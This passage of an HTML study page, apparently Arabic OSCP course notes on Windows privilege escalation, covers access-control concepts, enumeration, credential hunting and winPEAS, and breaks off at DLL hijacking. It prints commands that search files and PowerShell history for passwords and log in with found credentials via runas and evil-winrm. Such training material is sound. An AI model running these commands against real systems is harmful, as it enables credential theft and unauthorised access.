@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 14: رفع الامتيازات على Windows</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  /* SVG helpers */
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-14$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 14</span>
+    <h1>رفع الامتيازات على Windows (Privilege Escalation)</h1>
+    <p class="lede">من الوصول المحدود لـ SYSTEM — عبر التعداد الدقيق للبيئة، اصطياد بيانات الاعتماد المخبأة، واستغلال الخدمات والـ Scheduled Tasks والثغرات الموجودة في نظام التشغيل نفسه.</p>
+    <div class="tags">
+      <span class="tag">winpeas</span>
+      <span class="tag">service-hijacking</span>
+      <span class="tag">dll-hijacking</span>
+      <span class="tag">unquoted-paths</span>
+      <span class="tag">scheduled-tasks</span>
+      <span class="tag">seimpersonateprivilege</span>
+      <span class="tag">kernel-exploits</span>
+      <span class="tag">uac-bypass</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span>مقدمة: نموذج التحكّم في الامتيازات بـ Windows</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>تعداد البيئة وصيد بيانات الاعتماد</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>استغلال خدمات Windows</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>Scheduled Tasks وKernel Exploits وSeImpersonatePrivilege</span></a>
+  <a class="toc-item" href="#methodology"><span class="toc-num">04</span><span>منهجية الـ PrivEsc الكاملة — 8 خطوات</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ INTRO -->
+<h1 id="intro">Module 14: رفع الامتيازات على Windows</h1>
+<p>رفع الامتيازات (Privilege Escalation) هو تحويل وصول محدود لحساب مرتفع الصلاحيات — عادةً <code>SYSTEM</code> أو <code>Administrator</code>. الموديول ده بيغطّي ثلاث محاور:</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>تعداد البيئة من الداخل — الرؤية الشاملة قبل أي خطوة</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>استغلال الخدمات المُهيَّأة بشكل خاطئ (Services, DLLs, Unquoted Paths)</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>تقنيات متقدّمة: Scheduled Tasks، Kernel Exploits، SeImpersonatePrivilege</span></div>
+</div>
+
+<h3>نموذج التحكّم في الوصول بـ Windows</h3>
+<p>Windows بيعتمد على 4 مكوّنات أساسية للتحكّم في الامتيازات — فهمها ضروري لتحديد مسارات الترقية:</p>
+
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">SID</span>
+  <div class="mtitle">Security Identifiers</div>
+  <div class="mdesc">كل مستخدم أو مجموعة ليها SID فريد — ما بيتغيّرش حتى لو اتغيّر الاسم. قيم RID المنخفضة = حسابات مدمجة (Everyone, LocalSystem, Built-in Admin).</div>
+</div>
+<div class="method-card">
+  <span class="mnum">Token</span>
+  <div class="mtitle">Access Tokens</div>
+  <div class="mdesc">بيتنشأ عند تسجيل الدخول — بيحتوي على SID المستخدم، SIDs المجموعات، والامتيازات المعيَّنة. كل عملية بترث Primary Token. Impersonation Tokens بتسمح للـ Threads بالعمل تحت سياق أمان مختلف.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">MIC</span>
+  <div class="mtitle">Mandatory Integrity Control</div>
+  <div class="mdesc">مستويات نزاهة هرمية من Untrusted للـ System. عملية مش ممكن تعدَّل Objects بمستوى نزاهة أعلى منها — بيمنع تطبيقات الـ Sandbox من التلاعب بمكوّنات النظام.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">UAC</span>
+  <div class="mtitle">User Account Control</div>
+  <div class="mdesc">حتى الـ Admins بيشتغلوا بـ Filtered Token محدود افتراضياً. الترقية بتطلب نافذة موافقة صريحة. تجاوز الـ UAC أو إيجاد Tokens مُهيَّأة بشكل خاطئ = مسار للترقية.</div>
+</div>
+</div>
+
+<h3>مستويات النزاهة (Integrity Levels)</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 130" xmlns="http://www.w3.org/2000/svg">
+  <!-- Untrusted -->
+  <rect x="8" y="22" width="112" height="65" rx="7" class="dsvg-box"/>
+  <text x="64" y="47" text-anchor="middle" class="dsvg-muted" font-size="11" font-weight="700">Untrusted</text>
+  <text x="64" y="63" text-anchor="middle" class="dsvg-muted" font-size="9">Sandbox apps</text>
+  <text x="64" y="77" text-anchor="middle" class="dsvg-muted" font-size="9">RID 0x0000</text>
+  <!-- Low -->
+  <rect x="128" y="18" width="112" height="73" rx="7" class="dsvg-box-b"/>
+  <text x="184" y="45" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">Low</text>
+  <text x="184" y="61" text-anchor="middle" class="dsvg-muted" font-size="9">Protected Mode IE</text>
+  <text x="184" y="76" text-anchor="middle" class="dsvg-muted" font-size="9">Downloads folder</text>
+  <!-- Medium -->
+  <rect x="248" y="14" width="112" height="81" rx="7" class="dsvg-box-a"/>
+  <text x="304" y="43" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">Medium</text>
+  <text x="304" y="59" text-anchor="middle" class="dsvg-muted" font-size="9">Normal user processes</text>
+  <text x="304" y="74" text-anchor="middle" class="dsvg-muted" font-size="9">Standard apps</text>
+  <text x="304" y="88" text-anchor="middle" class="dsvg-amber" font-size="9">← نقطة البداية</text>
+  <!-- High -->
+  <rect x="368" y="10" width="112" height="89" rx="7" class="dsvg-box-r"/>
+  <text x="424" y="40" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">High</text>
+  <text x="424" y="56" text-anchor="middle" class="dsvg-muted" font-size="9">Admin elevated apps</text>
+  <text x="424" y="71" text-anchor="middle" class="dsvg-muted" font-size="9">UAC consent → High</text>
+  <text x="424" y="88" text-anchor="middle" class="dsvg-red" font-size="9">← هدف PrivEsc</text>
+  <!-- System -->
+  <rect x="488" y="4" width="204" height="101" rx="7" class="dsvg-box-r" style="stroke-width:2;"/>
+  <text x="590" y="36" text-anchor="middle" class="dsvg-red" font-size="13" font-weight="700">SYSTEM</text>
+  <text x="590" y="54" text-anchor="middle" class="dsvg-muted" font-size="9">Kernel, OS services</text>
+  <text x="590" y="69" text-anchor="middle" class="dsvg-muted" font-size="9">LocalSystem processes</text>
+  <text x="590" y="87" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">★ الهدف النهائي</text>
+  <!-- Up arrows between levels -->
+  <text x="64" y="116" text-anchor="middle" class="dsvg-muted" font-size="9">→</text>
+  <text x="350" y="118" text-anchor="middle" class="dsvg-muted" font-size="9">مستوى النزاهة يرتفع من اليسار لليمين ←</text>
+</svg>
+<div class="diagram-caption">عملية بمستوى Medium مش ممكن تعدَّل Object بمستوى High أو System — المسار للـ SYSTEM يمرّ بتجاوز هذه الحواجز</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">تعداد البيئة وصيد بيانات الاعتماد</span></h2>
+
+<h3>الوعي الظرفي — Situational Awareness</h3>
+<div class="callout warning">
+<div class="callout-label">⚠ غلطة شائعة</div>
+<p>بعد الحصول على Shell، التسرّع في تشغيل Exploits غلطة كبيرة. المختبرون المحترفون بيتعاملوا مع هذه المرحلة كـ Internal Reconnaissance — الاكتشافات هنا بتحدّد الاستراتيجية الكاملة للترقية.</p>
+</div>
+
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>ما يكشفه</th><th>ما تبحث عنه</th></tr></thead>
+<tbody>
+<tr><td><code>whoami</code></td><td>المستخدم الحالي واسم الجهاز</td><td>هل أنت service account؟ admin?</td></tr>
+<tr><td><code>whoami /groups</code></td><td>المجموعات الحالية وIntegrity Level</td><td>Backup Operators, Remote Desktop Users, Administrators</td></tr>
+<tr><td><code>whoami /priv</code></td><td>الامتيازات المخصَّصة للمستخدم</td><td>SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege</td></tr>
+<tr><td><code>Get-LocalUser</code></td><td>كل الحسابات المحلية</td><td>حسابات بأسماء "admin" = أهداف عالية القيمة</td></tr>
+<tr><td><code>Get-LocalGroup</code></td><td>المجموعات المحلية وأعضاؤها</td><td>من في Administrators?</td></tr>
+<tr><td><code>systeminfo</code></td><td>نظام التشغيل، الـ Build، المعمارية</td><td>بيحدّد الـ Exploits المناسبة</td></tr>
+<tr><td><code>ipconfig /all</code></td><td>كل الـ Network Adapters</td><td>شبكات إضافية قابلة للوصول</td></tr>
+<tr><td><code>route print</code></td><td>جدول التوجيه</td><td>مسارات Lateral Movement</td></tr>
+<tr><td><code>netstat -ano</code></td><td>المنافذ المفتوحة وما بيستمع عليها</td><td>3389=RDP فعّال، 3306=MySQL، 443=Web</td></tr>
+<tr><td><code>Get-Process</code></td><td>العمليات الجارية</td><td>ربط العمليات بالمنافذ والتطبيقات المثبَّتة</td></tr>
+<tr><td><code>Get-WmiObject Win32_Service</code></td><td>كل الخدمات ومساراتها</td><td>خدمات خارج مجلدات Windows الافتراضية</td></tr>
+</tbody>
+</table></div>
+
+<h3>صيد بيانات الاعتماد في الملفات</h3>
+<p>البيانات الحساسة غالبًا بتكون غير محمية — مخزَّنة بلا مبالاة في ملفات نصية وملفات إعداد وملاحظات الاجتماعات. الخطأ البشري بيكون أسهل استغلالاً من ثغرات البرامج.</p>
+
+<div class="callout case">
+<div class="callout-label">⚙ سيناريو حقيقي — CLIENTWK220</div>
+<p>
+①  البحث عن <code>.kdbx</code> → لا شيء<br/>
+②  فحص إعداد XAMPP → <code>passwords.txt</code> (كلمات مرور افتراضية فقط)<br/>
+③  البحث في Desktop → <code>asdf.txt</code> = ملاحظات اجتماع بكلمة مرور Steve!<br/>
+④  Steve = Remote Desktop Users → RDP كـ Steve<br/>
+⑤  قراءة إعداد MySQL (متاح الآن) → <code>admin123admin123!</code><br/>
+⑥  نفس كلمة المرور = Windows credential لـ backupadmin (Admin group)<br/>
+<strong>الدرس: إعادة استخدام كلمات المرور عبر الخدمات شائعة جداً</strong>
+</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">powershell — credential hunting</span><pre><code># البحث عن KeePass vaults
+Get-ChildItem -Path C:\ -Include *.kdbx `
+  -Recurse -ErrorAction SilentlyContinue
+
+# البحث في ملفات المستخدم عن بيانات حساسة
+Get-ChildItem -Path C:\Users\dave `
+  -Include *.txt,*.pdf,*.docx,*.xlsx,*.ini,*.config `
+  -Recurse -ErrorAction SilentlyContinue
+
+# قراءة ملف النوتس
+type C:\Users\dave\Desktop\asdf.txt
+
+# الانتقال لحساب آخر بعد إيجاد كلمة المرور
+runas /user:backupadmin cmd
+# → whoami: clientwk220\backupadmin
+
+# البحث عن passwords في ملفات الإعداد
+findstr /si "password" C:\*.xml C:\*.ini C:\*.txt 2>nul
+findstr /si "password" C:\xampp\*.conf 2>nul
+</code></pre></div>
+
+<h3>PowerShell كمنجم للمعلومات</h3>
+<p>المنظمات بتفعَّل PowerShell Transcription وScript Block Logging لاكتشاف الهجمات — لكن هذه السجلات بتلتقط أيضاً كلمات المرور وأسماء الخوادم وأفعال المدراء بشكل غير مقصود.</p>
+
+<div class="callout tip">
+<div class="callout-label">✓ PSReadLine History — سرّ مهم</div>
+<p><code>Clear-History</code> بتمسح فقط تاريخ الجلسة الحالية — PSReadLine بيخزَّن الأوامر بشكل دائم في ملف منفصل. كتير من المدراء مش عارفين هذا الملف موجود → مصدر غني جداً بالأوامر الحساسة.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">powershell — PS artifacts</span><pre><code># إيجاد ملف PSReadLine History
+(Get-PSReadlineOption).HistorySavePath
+# → C:\Users\dave\AppData\Roaming\Microsoft\Windows\
+#     PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# قراءة الـ History
+type ConsoleHost_history.txt
+# → Set-Secret -Name 'Server02 Admin PW' -Secret 'paperEarMonitor33@'
+# → Start-Transcript -Path ...\transcript01.txt
+
+# قراءة الـ Transcript — بيسجَّل كل شيء
+type transcript01.txt
+# → $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText
+
+# استخدام كلمة المرور المُكتشَفة
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123!!"
+</code></pre></div>
+
+<h3>winPEAS — التعداد الآلي</h3>
+<p>winPEAS (جزء من مشروع PEASS-ng) بيفحص النظام ويبرز النتائج بالألوان حسب الخطورة.</p>
+
+<div class="table-wrap"><table>
+<thead><tr><th>اللون</th><th>المعنى</th><th>الإجراء</th></tr></thead>
+<tbody>
+<tr><td>🔴 أحمر</td><td>Misconfiguration خطيرة / escalation vector</td><td>فحص فوري</td></tr>
+<tr><td>🟡 أصفر</td><td>معلومات مثيرة للاهتمام</td><td>تقييم يدوي</td></tr>
+<tr><td>🟢 أخضر</td><td>الحماية مفعَّلة</td><td>توثيق كـ Defense</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">powershell — winpeas</span><pre><code># تشغيل winPEAS (نقله للهدف أولاً)
+.\winPEASany.exe    # لكل المعماريات
+.\winPEASx64.exe    # لـ 64-bit فقط
+
+# تصدير الناتج لملف للتحليل
+.\winPEASx64.exe > winpeas_output.txt
+
+# البدائل لو winPEAS اتحجب بالـ AV
+.\Seatbelt.exe -group=all
+.\JAWS-enum.ps1
+</code></pre></div>
+
+<div class="callout warning">
+<div class="callout-label">⚠ حدود الأتمتة</div>
+<p>winPEAS فوَّت ملف PSReadLine History والـ Transcript files في السيناريو التجريبي. الأدوات الآلية ممكن تتعطَّل بالـ AV. دايماً تحقَّق يدوياً من النتائج الآلية — False Positives بتحصل. الأتمتة مُسرِّعة، مش بديلة، عن التعداد اليدوي.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">استغلال خدمات Windows</span></h2>
+<p>الخدمات (Services) هي عمليات خلفية يتحكّم فيها Service Manager — بتبدأ تلقائياً عند الإقلاع وبتشتغل بدون تفاعل مستخدم. كتير من الخدمات المدمجة بتشتغل كـ LocalSystem — وخدمات الجهات الخارجية غالبًا بتتثبَّت بصلاحيات خاطئة.</p>
+
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">01</span>
+  <div class="mtitle">🔧 Service Binary Hijacking</div>
+  <div class="mdesc">الكتابة فوق ملف الخدمة التنفيذي لما يكون في Directory بصلاحيات كتابة للمستخدم. عند إعادة تشغيل الخدمة، الكود الخبيث ينفَّذ بامتيازات الخدمة.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">02</span>
+  <div class="mtitle">📦 DLL Hijacking</div>
